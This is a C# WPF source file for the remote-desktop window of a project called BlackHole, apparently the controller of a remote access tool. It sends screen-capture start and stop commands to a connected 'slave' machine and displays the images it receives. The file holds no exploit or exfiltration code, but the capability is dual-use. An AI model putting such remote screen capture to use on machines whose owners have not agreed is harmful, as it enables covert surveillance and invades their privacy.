using System.IO;
using System.Windows;
using System.Windows.Media.Imaging;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class RemoteDesktop
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public RemoteDesktop(Slave slave) 
            : base(slave)
        {
            InitializeComponent();

            // in case we leave the window withouth stopping
            Closing += (s, e) => StopCapture();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnStartCapture(object sender, RoutedEventArgs e)
            => StartCapture(0, int.Parse(TxtBoxQuality.Text), int.Parse(TxtBoxRate.Text));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnStopCapture(object sender, RoutedEventArgs e)
            => StopCapture();

        /// <summary>
        /// 
        /// </summary>
        private void StartCapture(int screen = 0, int quality = 10, int rate = 10) =>
            Send(new StartScreenCaptureMessage
            {
                Quality = quality,
                Rate = rate,
                ScreenNumber = screen
            });

        /// <summary>
        /// 
        /// </summary>
        private void StopCapture() =>
            Send(new StopScreenCaptureMessage());
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void UpdateScreenCapture(ScreenCaptureMessage message)
        {
            if (ScreenCaptureImage.Source != null)
                ((BitmapImage)ScreenCaptureImage.Source).StreamSource.Dispose();
            ScreenCaptureImage.Source = BitmapToImageSource(message.RawImage);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="rawData"></param>
        /// <returns></returns>
        private BitmapImage BitmapToImageSource(byte[] rawData)
        {
            using (var stream = new MemoryStream(rawData))
            {
                var bitmapimage = new BitmapImage();
                bitmapimage.BeginInit();
                bitmapimage.StreamSource = stream;
                bitmapimage.CacheOption = BitmapCacheOption.OnLoad;
                bitmapimage.EndInit();
                return bitmapimage;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async void OnEvent(SlaveEvent ev)
        {
            base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<ScreenCaptureMessage>(UpdateScreenCapture);
                        break;
                }
            });
        }
    }
}
